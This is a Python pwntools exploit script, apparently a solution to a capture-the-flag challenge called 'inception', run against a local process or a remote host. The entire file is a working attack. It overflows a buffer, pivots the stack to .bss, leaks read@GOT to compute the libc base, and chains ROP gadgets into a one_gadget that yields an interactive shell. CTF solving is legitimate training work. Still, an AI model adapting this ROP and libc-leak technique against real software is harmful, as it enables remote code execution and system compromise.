#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./inception', env = {'LD_PRELOAD': './libc.so.6'})
else:
    s = remote('37.139.17.37', 1338)

elf = ELF('./inception')
libc = ELF('./libc.so.6')

pop_rdi = 0x400cf3
pop_rsi_r15 = 0x400cf1
leave = 0x400b55

payload = ''
payload += 'ASIS{N0T_R34LLY_4_FL4G}\0'
payload += 'A' * (0x20 - len(payload))
payload += p64(elf.bss(0x200 - 0x8))
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(elf.got['read']) + p64(0)
payload += p64(elf.symbols['write'])
payload += p64(pop_rdi) + p64(0)
for i in range(3):
    payload += p64(pop_rsi_r15) + p64(elf.bss(0x200 + i * 8)) + p64(0)
    payload += p64(elf.symbols['read'])
payload += p64(pop_rsi_r15) + p64(elf.bss(0x218)) + p64(0)
payload += p64(leave)
s.sendafter('something: ', payload)
s.recv(8)
libc_base = u64(s.recv(8)) - libc.symbols['read']
log.info('libc base: %#x' % libc_base)

pop_rdx = libc_base + 0x1b96
pop_rsi = libc_base + 0x23e6a

payload = ''
payload += p64(pop_rdx) + p64(0x100)
payload += p64(elf.symbols['read'])
s.send(payload)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
payload = ''
payload += p64(pop_rdi) + p64(6)
payload += p64(pop_rsi) + p64(elf.bss(0x258))
payload += p64(pop_rdx) + p64(0x80)
payload += p64(elf.symbols['write'])
payload += p64(elf.symbols['exit'])
payload += 'TRANSMISSION_OVER\0'
payload += 'A' * (0x28 + 0x40 - len(payload))
payload += p64(libc_base + one_gadgets[0])
s.send(payload)

s.interactive()
